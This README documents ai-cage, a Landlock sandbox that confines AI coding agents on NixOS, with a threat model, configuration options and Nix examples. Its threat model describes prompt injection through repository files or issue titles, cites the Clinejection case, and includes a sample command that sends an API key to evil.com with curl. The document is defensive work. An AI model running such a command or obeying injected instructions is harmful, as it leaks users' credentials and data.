# ai-cage

ai-cage is a Landlock-based sandbox for AI coding agents on NixOS.

## Threat model

### What ai-cage protects against

AI coding agents can be tricked via prompt injection — a malicious file in a repository, a crafted error message, or a poisoned issue title can instruct the agent to run arbitrary commands. This is not theoretical: the [Clinejection](https://adnanthekhan.com/posts/clinejection/) attack demonstrated how a prompt injection in a GitHub issue title led to full supply-chain compromise of Cline's production releases.

ai-cage uses Linux Landlock to constrain what a prompt-injected agent can do on your local machine.

| Attack | Protected? | How |
| :--- | :--- | :--- |
| Read ~/.ssh, ~/.aws, ~/.gnupg, ~/.config | ✅ Yes | HOME is replaced with a private state directory. The real home is invisible to the caged process. |
| Read .env files outside the workspace | ✅ Yes | Only the workspace directory and the cage state directory are accessible. |
| Write or copy files outside the workspace | ✅ Yes | Landlock restricts writes to the workspace and the cage state directory only. |
| Execute arbitrary binaries (curl, nc, python) | ✅ Yes | Only binaries in the packages closure (or filesystem.rox paths) can execute. If curl is not in your packages list, it cannot run. |
| Install and run malicious npm/pip packages | ✅ Partially | The install runs inside the sandbox, so preinstall scripts cannot read your real home or write outside the workspace. But if the agent has network access and a package manager on PATH, the install itself will succeed within the sandbox. |
| Connect to unauthorized network services | ✅ Yes | Landlock restricts outbound TCP to the ports you explicitly allow. No port list = no network. |
| Spawn a reverse shell | ✅ Partially | The shell binary must be in packages, and the attacker's port must be in connectTcp. With aiAgent profile (only 443 and 22 open), a reverse shell to a non-standard port is blocked. But a reverse shell to port 443 is technically possible if the right tools are in packages. |
| Escalate privileges from a child process | ✅ Yes | Landlock restrictions are inherited by all child processes and cannot be lifted. A subprocess cannot gain more access than its parent. |

### What ai-cage does NOT protect against

| Attack | Why |
| :--- | :--- |
| Exfiltration of env vars passed via env.pass | If you pass `ANTHROPIC_API_KEY` into the cage and the agent has network access + a tool like curl on PATH, injected code can `curl -d "$ANTHROPIC_API_KEY" https://evil.com`. The key is in process memory — Landlock cannot restrict what data is sent over an allowed connection. |
| Data exfiltration over allowed ports | Landlock filters by port number only, not by IP address or hostname. Any data can be sent to any destination on an allowed port. If port 443 is open, the cage cannot distinguish your LLM provider from an attacker's server. |
| Reading or modifying files within the workspace | The agent needs workspace access to function. A prompt-injected agent can read, modify, or delete any file in the workspace directory. |
| CI/CD pipeline attacks | ai-cage is a local sandbox. It has no bearing on how your GitHub Actions workflows, build caches, or release pipelines operate. Attacks like Clinejection's cache poisoning stage target CI infrastructure, not your development machine. |
| Attacks via already-open file descriptors | Landlock cannot restrict file descriptors inherited from the parent process. If the cage wrapper has a file open before exec, the caged process retains access. |

### Reducing risk further

To minimize the env var exfiltration risk:

- **Remove curl, wget, and nc from packages** unless the agent actually needs them. Without an HTTP client binary, exfiltrating data is much harder (though not impossible — the agent's own binary may have HTTP capabilities built in).
- **Use the offline profile** for tasks that don't need network access. With no allowed ports, no data can leave.
- **Limit env.pass to the minimum.** Don't pass `GITHUB_TOKEN` if the agent doesn't need GitHub access for the current task.
- **For full network isolation by destination**, you would need nftables or a network namespace with a filtering proxy. This requires root and is outside Landlock's capabilities.

## How it works

The tool uses the Landlock Linux Security Module (LSM) via the landrun CLI to enforce a strict default-deny policy.
Nix closures provide a precise allowlist for executables. Only the binaries in the packages list and their dependencies can run.
The sandbox replaces your home directory with a private state directory. This prevents access to your real ~/.ssh, ~/.config, or ~/.aws folders.

## Requirements

- Linux kernel 5.13 or newer for filesystem restrictions.
- Linux kernel 6.7 or newer for network port filtering.

## Quick start

Add ai-cage as a flake input and define a cage in your outputs.

```nix
{
  inputs = {
    nixpkgs.url = "github:NixOS/nixpkgs/nixos-unstable";
    ai-cage.url = "github:rolfst/ai-cage";
  };

  outputs = { self, nixpkgs, ai-cage }:
    let
      pkgs = import nixpkgs {
        system = "x86_64-linux";
        overlays = [ ai-cage.overlays.default ];
      };
    in {
      packages.x86_64-linux.my-agent = ai-cage.lib.cage { inherit pkgs; } {
        name = "my-agent";
        profile = "aiAgent";
        argv = [ "${pkgs.bash}/bin/bash" ];
        packages = with pkgs; [ bash coreutils git ];
      };
    };
}
```

## Configuration reference

| Option | Type | Default | Description |
| :--- | :--- | :--- | :--- |
| name | string | required | Unique name for the cage, used for the state directory. |
| profile | null, string, or attrset | null | Built-in profile: offline, aiAgent, or devNet. |
| argv | list of strings | required | The command and arguments to run inside the cage. |
| packages | list of derivations | [] | Nix packages available inside. Only these can be executed. |
| workspace.path | string | "$PWD" | The directory the agent is allowed to write to. |
| filesystem.ro | list of strings | [] | Extra read-only paths from the host. |
| filesystem.rox | list of strings | [] | Extra read+execute paths from the host. Use for binaries outside the Nix store. |
| filesystem.rw | list of strings | [] | Extra read-write paths from the host. |
| filesystem.rwx | list of strings | [] | Extra read-write+execute paths from the host. |
| nixStore.read | bool | true | Mount /nix/store as read-only. |
| nixStore.exec | string | "closure" | Execution mode. Only "closure" is supported. |
| network.connectTcp | list of ints | [] | Allowed outbound TCP ports. |
| ssh.agentForward | bool | false | Forward SSH_AUTH_SOCK into the cage. |
| env.pass | list of strings | [] | Host environment variables to pass through. |
| env.set | attrset | {} | Environment variables to set to specific values. |
| env.appendPath | list of strings | [] | Extra directories to append to PATH. Use for binaries outside the Nix store. |

## Profiles reference

- offline: No network access. Nix store is read-only with closure-based execution.
- aiAgent: Allows HTTPS (443) and SSH (22). Enables SSH agent forwarding. Reads DNS config. Passes TERM and LANG.
- devNet: Same as aiAgent but adds common development ports: 80, 8080, 3000, 5000.

## How to ALLOW access

- Read a config file: `filesystem.ro = [ "/etc/gitconfig" ]`
- Execute an external binary: `filesystem.rox = [ "$HOME/.npm-global" ]`
- Put external binaries on PATH: `env.appendPath = [ "$HOME/.npm-global/bin" ]`
- Write to a directory: `filesystem.rw = [ "/tmp/build-output" ]`
- Allow a network port: `network.connectTcp = [ 443 8080 ]`
- Allow an extra tool: Add the package to the `packages` list.
- Forward SSH agent: `ssh.agentForward = true`
- Pass env vars: `env.pass = [ "EDITOR" "GITHUB_TOKEN" ]`

## How to BLOCK access

The sandbox uses a default-deny model. If you don't explicitly allow it, it's blocked.
- Your home directory is replaced by a private one at ~/.local/state/ai-cage/{name}/.
- SSH key files are never visible. Only the agent socket is accessible if forwarded.
- Network is disabled unless you specify network.connectTcp ports.
- Only binaries in the packages closure can execute.
- Host environment variables are stripped unless listed in env.pass.

Example: To block all network, use `profile = "offline"` or omit `network.connectTcp`.
Example: To allow git clone but block git push over SSH, only allow port 443 and omit port 22.

## Supported tools

Pre-built cage examples are provided in `examples/` for these AI coding agents. All are available in nixpkgs.

| Tool | Package | Binary | API key env var | Extra ports |
| :--- | :--- | :--- | :--- | :--- |
| Claude Code | `claude-code` | `claude` | `ANTHROPIC_API_KEY` | |
| GitHub Copilot CLI | `github-copilot-cli` | `copilot` | `GITHUB_TOKEN` | |
| Gemini CLI | `gemini-cli` | `gemini` | `GEMINI_API_KEY` | |
| OpenAI Codex | `codex` | `codex` | `OPENAI_API_KEY` | 1455 (OAuth) |
| opencode | `opencode` | `opencode` | varies by provider | |

All tools use the `aiAgent` profile (HTTPS on 443, SSH on 22, SSH agent forwarding). The only exception is Codex, which also needs port 1455 for its OAuth login callback.

Example: caging Claude Code in your flake:

```nix
packages.x86_64-linux.claude = ai-cage.lib.cage { inherit pkgs; } {
  name = "claude-code";
  profile = "aiAgent";
  argv = [ "${pkgs.claude-code}/bin/claude" ];
  packages = with pkgs; [
    claude-code git coreutils findutils gnugrep ripgrep fd bash
  ];
  env = { pass = [ "TERM" "LANG" "ANTHROPIC_API_KEY" ]; };
};
```

See `examples/` for all tool configurations. Copy and adjust to your needs.

### Caging an npm-installed tool

If a tool is not in nixpkgs or you want a specific npm version, you can fetch it from the npm registry directly. See `examples/opencode-npm.nix` for a complete example that extracts the opencode binary from its npm tarball:

```nix
opencode-from-npm = pkgs.stdenvNoCC.mkDerivation {
  pname = "opencode";
  version = "1.2.21";
  src = pkgs.fetchurl {
    url = "https://registry.npmjs.org/opencode-linux-x64/-/opencode-linux-x64-1.2.21.tgz";
    hash = "sha256-N2HZC4PuILz/bNM7Ns1tM2jJo9WgpY5DIgXPKK50vzc=";
  };
  sourceRoot = ".";
  installPhase = ''
    mkdir -p $out/bin
    cp package/bin/opencode $out/bin/opencode
    chmod +x $out/bin/opencode
  '';
};
```

Then pass it to the cage like any other package:

```nix
ai-cage.lib.cage { inherit pkgs; } {
  name = "opencode-npm";
  profile = "aiAgent";
  argv = [ "${opencode-from-npm}/bin/opencode" ];
  packages = [ opencode-from-npm pkgs.git pkgs.coreutils pkgs.bash ];
  env = { pass = [ "TERM" "LANG" "ANTHROPIC_API_KEY" ]; };
}
```

This pattern works for any npm-distributed AI tool. Replace the tarball URL and binary path for other tools.

### Caging a globally-installed binary (outside the Nix store)

If a tool is already installed on your system via npm, pip, cargo, or another package manager, you can cage it without pulling it into the Nix store. Use `filesystem.rox` to grant read+execute access to the directory containing the binary.

Example: caging opencode installed via `npm i -g opencode-ai` at `~/.npm-global/bin/opencode`:

```nix
ai-cage.lib.cage { inherit pkgs; } {
  name = "opencode-global";
  profile = "aiAgent";
  argv = [ "$HOME/.npm-global/bin/opencode" ];
  packages = with pkgs; [ git coreutils bash nodejs ];
  filesystem = {
    rox = [ "$HOME/.npm-global" ];
  };
  env = {
    pass = [ "TERM" "LANG" "ANTHROPIC_API_KEY" ];
    # Put the external bin dir on PATH so other tools can find it by name.
    appendPath = [ "$HOME/.npm-global/bin" ];
  };
}
```

The key difference: `packages` only lists supporting tools from nixpkgs, while `filesystem.rox` grants execution rights to the external binary's directory and `env.appendPath` puts it on PATH. The binary itself does not need to be a Nix derivation.

### Combining Nix packages with externally-installed tools

You can mix Nix-managed tools with system-installed binaries in the same cage. For example, opencode from nixpkgs + Copilot CLI installed globally via npm:

```nix
ai-cage.lib.cage { inherit pkgs; } {
  name = "opencode-with-copilot";
  profile = "devNet";
  argv = [ "${pkgs.opencode}/bin/opencode" ];
  packages = with pkgs; [ opencode gh git coreutils bash nodejs ];
  filesystem = {
    rox = [ "$HOME/.npm-global" ];
  };
  env = {
    pass = [ "TERM" "LANG" "ANTHROPIC_API_KEY" "GITHUB_TOKEN" ];
    appendPath = [ "$HOME/.npm-global/bin" ];
  };
}
```

Both opencode and copilot run in the same Landlock sandbox. Every child process inherits the same restrictions — a subprocess cannot escalate beyond what the parent cage allows.

See `examples/nodejs-server.nix` for a full flake showing this pattern with a Node.js dev server.

## Limitations

- Landlock filters by port only. It cannot filter by IP address or hostname.
- It cannot restrict file descriptors that are already open when the cage starts.
- This is a Linux-only tool. It won't work on macOS or Windows.

## Testing

Run the test script to verify the sandbox is working correctly.

```bash
./tests/test-cage.sh
```

## Project structure

```text
.
├── flake.nix
├── examples/
│   ├── claude-code.nix    # Anthropic Claude Code
│   ├── codex.nix          # OpenAI Codex
│   ├── copilot-cli.nix    # GitHub Copilot CLI
│   ├── gemini-cli.nix     # Google Gemini CLI
│   ├── opencode.nix       # opencode (from nixpkgs)
│   ├── opencode-npm.nix   # opencode (from npm registry)
│   ├── opencode-global.nix # opencode (globally installed via npm)
│   └── nodejs-server.nix  # Node.js server project with caged opencode
├── lib/
│   ├── cage.nix         # Core logic for generating the sandbox wrapper
│   └── profiles.nix     # Pre-defined configurations
├── pkgs/
│   └── landrun.nix      # Nix expression for the landrun CLI
└── tests/
    └── test-cage.sh     # Integration tests
```
